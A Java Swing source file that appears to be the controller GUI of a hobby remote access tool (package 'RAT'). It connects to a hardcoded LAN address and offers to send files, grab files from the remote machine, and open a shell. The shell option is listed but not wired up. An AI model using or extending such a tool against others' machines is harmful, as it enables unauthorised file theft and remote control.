package RAT.FTP;

import RAT.RAT.TransparentFrame;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.Socket;

public class DemoClient {
    private static int x = 800;
    private static int y = 600;

    public static void main(String args[]) throws Exception {

        Socket socfd = new Socket("192.168.1.49", 4000);
        FTPClient ftp = new FTPClient(socfd);
        DefaultListModel<String> listModel = new DefaultListModel<>();
        listModel.addElement("Send File");
        listModel.addElement("Grab File");
        listModel.addElement("Open Shell");
        JList l = new JList(listModel);

        l.setSelectionMode(ListSelectionModel.SINGLE_INTERVAL_SELECTION);
        l.setLayoutOrientation(JList.VERTICAL);
        l.setVisibleRowCount(-1);
        l.setBounds(10, 150, 125, 100);
        l.setFont(new Font("Tahoma", 0, 25));


        JPanel titlePanel = new JPanel();
        titlePanel.setLayout(new BorderLayout());
        JLabel title = new JLabel("FTP GUI -- " + socfd.getInetAddress().getHostName());
        title.setHorizontalAlignment(SwingConstants.CENTER);
        title.setFont(new Font("Tahoma", 0, 25));
        titlePanel.add(title, BorderLayout.NORTH);
        titlePanel.setBounds(0, 0, 800, 100);

        JButton b = new JButton("GO!");
        b.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                int selected = l.getSelectedIndex();
                if (selected == 0) {
                    try {
                        ftp.SendFile();
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }else if (selected == 1){
                    try{
                        ftp.ReceiveFile();
                    }catch (Exception ex){
                        ex.printStackTrace();
                    }
                }
            }
        });
        b.setBounds(10,250,130,30);


        JFrame.setDefaultLookAndFeelDecorated(true);
        TransparentFrame f = new TransparentFrame();
        f.setTitle("FTP Client");
        f.setSize(800, 600);
        f.setLocationRelativeTo(null);
        f.setLayout(null);


        f.add(titlePanel);
        f.add(l);
        f.add(b);
        Timer t = new Timer(20, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (x != f.getWidth() || y != f.getHeight()) {
                    title.setHorizontalAlignment(0);
                    x = f.getWidth();
                    y = f.getHeight();
                    titlePanel.setBounds(0, 0, x, 100);
                    f.repaint();
                }
            }
        });
        t.start();
    }
}
